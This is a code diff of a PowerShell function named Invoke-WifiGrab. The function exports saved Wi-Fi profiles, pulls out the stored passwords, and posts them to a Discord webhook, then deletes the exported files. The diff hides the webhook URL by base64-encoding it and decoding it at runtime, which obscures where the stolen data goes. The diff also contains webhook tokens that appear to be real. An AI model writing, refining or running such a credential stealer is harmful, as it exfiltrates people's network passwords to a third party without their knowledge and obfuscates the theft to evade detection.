@@ -9,7 +9,9 @@ function Invoke-WifiGrab {
     Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 
     # Define the webhook URL
-    $webhookUrl = "https://discord.com/api/webhooks/1142817266640105592/-QJ9WtjaDql0VTdtva9RcAaLGyfN9bNYL0yDYiHBSaQsvau0di1-lI71t-slx6aVPNO6"
+    $webhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzIxMzA4ODU3OTEyNTI3OS9FdjJQMHdtTl8tZVBaY2I0ZkZXV093VDNuZzlFUW41bmxWT2VJSFhTTlBWU3VhcG5WMTdIdzhkRm9rMzBpbGtUbTZUVA=="
+    $decodedBytes = [System.Convert]::FromBase64String($webhookUrl)
+    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
 
     # Read the extracted key materials from the file
     $keyMaterialContent = Get-Content -Path "Wi-Fi-PASS" -Raw
@@ -59,8 +61,10 @@ function Invoke-WifiGrab {
         attachments = @()
     } | ConvertTo-Json
 
+    Write-Output $decodedString
+
     # Send data to Discord webhook
-    Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonData | Out-Null
+    Invoke-WebRequest -Uri $decodedString -Method Post -ContentType "application/json" -Body $jsonData | Out-Null
 
     # Optionally clean up the exported files
     Remove-Item Wi-*
